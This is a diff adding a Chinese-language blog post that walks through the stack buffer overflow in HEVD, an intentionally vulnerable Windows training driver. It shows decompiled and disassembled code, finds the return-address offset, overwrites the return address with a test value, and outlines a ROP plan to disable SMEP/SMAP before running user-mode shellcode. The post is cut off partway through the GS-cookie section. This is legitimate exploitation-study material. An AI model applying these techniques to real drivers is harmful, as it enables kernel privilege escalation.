@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HEVD-StackOverFlow - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+栈溢出，梦开始的地方
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="HEVD-StackOverFlow" />
+<meta property="og:description" content="
+栈溢出，梦开始的地方
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/hevd-stackoverflow/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-03T12:00:00+00:00" />
+<meta property="article:modified_time" content="2024-04-03T12:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HEVD-StackOverFlow"/>
+<meta name="twitter:description" content="
+栈溢出，梦开始的地方
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">HEVD-StackOverFlow</h1>
+			<div class="meta">Posted on Apr 3, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>栈溢出，梦开始的地方</p>
+</blockquote>
+<p>相关代码在仓库<a href="https://github.com/ldrx30/HEVDExploits">HEVDExploits</a></p>
+<h2 id="without-gs">Without GS</h2>
+<p>存在问题的区域</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span> <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222003</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> BufferOverflowStackIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span></code></pre></div><p>Ioctl获得用户态参数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">BufferOverflowStackIoctlHandler</span>(_IRP <span style="color:#ff79c6">*</span>Irp, _IO_STACK_LOCATION <span style="color:#ff79c6">*</span>IrpSp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>Type3InputBuffer; <span style="color:#6272a4">// rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  size_t InputBufferLength; <span style="color:#6272a4">// rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  Type3InputBuffer <span style="color:#ff79c6">=</span> IrpSp<span style="color:#ff79c6">-&gt;</span>Parameters.DeviceIoControl.Type3InputBuffer;
+</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3221225473</span>i64;
+</span></span><span style="display:flex;"><span>  InputBufferLength <span style="color:#ff79c6">=</span> IrpSp<span style="color:#ff79c6">-&gt;</span>Parameters.DeviceIoControl.InputBufferLength;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( Type3InputBuffer )
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> TriggerBufferOverflowStack(Type3InputBuffer, InputBufferLength);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>读取到内核栈中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">TriggerBufferOverflowStack</span>(<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>UserBuffer, size_t Size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> KernelBuffer[<span style="color:#bd93f9">512</span>]; <span style="color:#6272a4">// [rsp+20h] [rbp-818h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  memset(KernelBuffer, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(KernelBuffer));
+</span></span><span style="display:flex;"><span>  ProbeForRead(UserBuffer, <span style="color:#bd93f9">0x800u</span>i64, <span style="color:#bd93f9">1u</span>);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserBuffer: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, UserBuffer);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserBuffer Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Size);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] KernelBuffer: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, KernelBuffer);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] KernelBuffer Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x800u</span>i64);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Triggering Buffer Overflow in Stack</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  memmove(KernelBuffer, UserBuffer, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>ProbeForRead</strong> 例程检查用户模式缓冲区是否实际驻留在地址空间的用户部分，并且是否正确对齐。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">ProbeForRead</span>(
+</span></span><span style="display:flex;"><span>  [in] <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">volatile</span> VOID <span style="color:#ff79c6">*</span>Address,
+</span></span><span style="display:flex;"><span>  [in] SIZE_T              Length,
+</span></span><span style="display:flex;"><span>  [in] ULONG               Alignment
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>从汇编看，不存在cookie，并且存在exception信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>AE                 call    memmove
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B3                 jmp     <span style="color:#8be9fd">short</span> loc_1400866D0
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B3 ;   } <span style="color:#6272a4">// starts at 14008661E
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B5 ; <span style="color:#ff79c6">---------------------------------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B5
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B5 $<span style="color:#8be9fd;font-style:italic">LN6_0</span>:                                 ; DATA <span style="color:#8be9fd;font-style:italic">XREF</span>: .<span style="color:#8be9fd;font-style:italic">rdata</span>:<span style="color:#bd93f9">00000001400026</span><span style="color:#bd93f9">9</span>C↑o
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B5 ;   <span style="color:#ff79c6">__except</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// owned by 14008661E
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B5                 mov     ebx, eax
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>B7                 mov     r9d, eax
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>BA                 lea     r8, aExceptionCode0 ; <span style="color:#f1fa8c">&#34;[-] Exception Code: 0x%X</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>C1                 mov     edx, <span style="color:#bd93f9">3</span>          ; Level
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>C6                 lea     ecx, [Size<span style="color:#ff79c6">+</span><span style="color:#bd93f9">4</span>Ah] ; ComponentId
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>C9                 call    <span style="color:#8be9fd;font-style:italic">cs</span>:__imp_DbgPrintEx
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>CF                 nop
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>D0
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>D0 <span style="color:#8be9fd;font-style:italic">loc_1400866D0</span>:                          ; CODE <span style="color:#8be9fd;font-style:italic">XREF</span>: TriggerBufferOverflowStack<span style="color:#ff79c6">+</span>CF↑j
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>D0                 mov     eax, ebx
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>D2                 lea     r11, [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">838</span>h<span style="color:#ff79c6">+</span>var_18]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>DA                 mov     rbx, [r11<span style="color:#ff79c6">+</span><span style="color:#bd93f9">20</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>DE                 mov     rsi, [r11<span style="color:#ff79c6">+</span><span style="color:#bd93f9">28</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400866E2</span>                 mov     rdi, [r11<span style="color:#ff79c6">+</span><span style="color:#bd93f9">30</span>h]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400866E6</span>                 mov     rsp, r11
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400866E9</span>                 pop     r15
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>EB                 pop     r14
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>ED                 pop     r12
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>EF                 retn
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">866</span>EF ; } <span style="color:#6272a4">// starts at 1400865E4
+</span></span></span></code></pre></div><p>首先，我们需要确定返回地址偏移，IDA标记了返回地址的地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-0000000000000818 KernelBuffer    dd <span style="color:#bd93f9">512</span> dup<span style="color:#ff79c6">(</span>?<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>-0000000000000018 var_18          db ?
+</span></span><span style="display:flex;"><span>-0000000000000017                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000016                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000015                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000014                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000013                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000012                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000011                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000010                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-000000000000000F                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-000000000000000E                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-000000000000000D                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-000000000000000C                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-000000000000000B                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-000000000000000A                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000009                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000008                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000007                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000006                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000005                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000004                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000003                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000002                 db ? ; undefined
+</span></span><span style="display:flex;"><span>-0000000000000001                 db ? ; undefined
+</span></span><span style="display:flex;"><span>+0000000000000000  r              db <span style="color:#bd93f9">8</span> dup<span style="color:#ff79c6">(</span>?<span style="color:#ff79c6">)</span>
+</span></span></code></pre></div><p>调试一下，确实如此</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>RtlFillMemory(lpBuffer, <span style="color:#bd93f9">0x1000</span>, <span style="color:#bd93f9">0x43</span>);
+</span></span><span style="display:flex;"><span>PDWORD64 rop <span style="color:#ff79c6">=</span> (PDWORD64)((PCHAR)lpBuffer <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x818</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>rop <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xdeadbeef</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> r rsp
+</span></span><span style="display:flex;"><span>rsp<span style="color:#ff79c6">=</span>fffff3082725a708
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> t
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">00000000</span>`deadbeef <span style="color:#ff79c6">??</span>              <span style="color:#ff79c6">???</span>
+</span></span></code></pre></div><p>因此</p>
+<ul>
+<li>ROP关闭SMEP/SMAP</li>
+<li>跳转到用户态进行执行shellcode</li>
+</ul>
+<h2 id="with-gs">With GS</h2>
+<p>code如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span> <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222007</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>	DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>	FakeObjectNonPagedPoolNxIoctlHandler <span style="color:#ff79c6">=</span> BufferOverflowStackGSIoctlHandler(Irp, CurrentStackLocation);
+</span></span><span style="display:flex;"><span>	v7 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_64;
+</span></span></code></pre></div><p>不同点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">TriggerBufferOverflowStackGS</span>(<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>UserBuffer, size_t Size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int8</span> KernelBuffer[<span style="color:#bd93f9">512</span>]; <span style="color:#6272a4">// [rsp+20h] [rbp-238h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  memset(KernelBuffer, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(KernelBuffer));
+</span></span><span style="display:flex;"><span>  ProbeForRead(UserBuffer, <span style="color:#bd93f9">0x200u</span>i64, <span style="color:#bd93f9">1u</span>);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserBuffer: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, UserBuffer);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] UserBuffer Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Size);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] KernelBuffer: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, KernelBuffer);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] KernelBuffer Size: 0x%zX</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">0x200u</span>i64);
+</span></span><span style="display:flex;"><span>  DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Triggering Buffer Overflow in Stack (GS)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  memmove(KernelBuffer, UserBuffer, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>看汇编可以看出来存在cookie的比较</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867E4</span>                 call    memmove
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867E9</span>                 jmp     <span style="color:#8be9fd">short</span> loc_140086806
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867E9</span> ;   } <span style="color:#6272a4">// starts at 140086754
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">867</span>EB ; <span style="color:#ff79c6">---------------------------------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">867</span>EB
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">867</span>EB $<span style="color:#8be9fd;font-style:italic">LN6_1</span>:                                 ; DATA <span style="color:#8be9fd;font-style:italic">XREF</span>: .<span style="color:#8be9fd;font-style:italic">rdata</span>:<span style="color:#bd93f9">00000001400026</span>D0↑o
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">867</span>EB ;   <span style="color:#ff79c6">__except</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// owned by 140086754
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">867</span>EB                 mov     ebx, eax
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">867</span>ED                 mov     r9d, eax
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867F</span><span style="color:#bd93f9">0</span>                 lea     r8, aExceptionCode0 ; <span style="color:#f1fa8c">&#34;[-] Exception Code: 0x%X</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867F</span><span style="color:#bd93f9">7</span>                 mov     edx, <span style="color:#bd93f9">3</span>          ; Level
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867F</span>C                 lea     ecx, [Size<span style="color:#ff79c6">+</span><span style="color:#bd93f9">4</span>Ah] ; ComponentId
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400867FF</span>                 call    <span style="color:#8be9fd;font-style:italic">cs</span>:__imp_DbgPrintEx
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86805</span>                 nop
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86806</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86806</span> <span style="color:#8be9fd;font-style:italic">loc_140086806</span>:                          ; CODE <span style="color:#8be9fd;font-style:italic">XREF</span>: TriggerBufferOverflowStackGS<span style="color:#ff79c6">+</span>D9↑j
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86806</span>                 mov     eax, ebx
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86808</span>                 mov     UserBuffer, [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">258</span>h<span style="color:#ff79c6">+</span>var_38]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">PAGE</span>:<span style="color:#bd93f9">00000001400</span><span style="color:#bd93f9">86810</span>                 xor     UserBuffer, rsp ; StackCookie
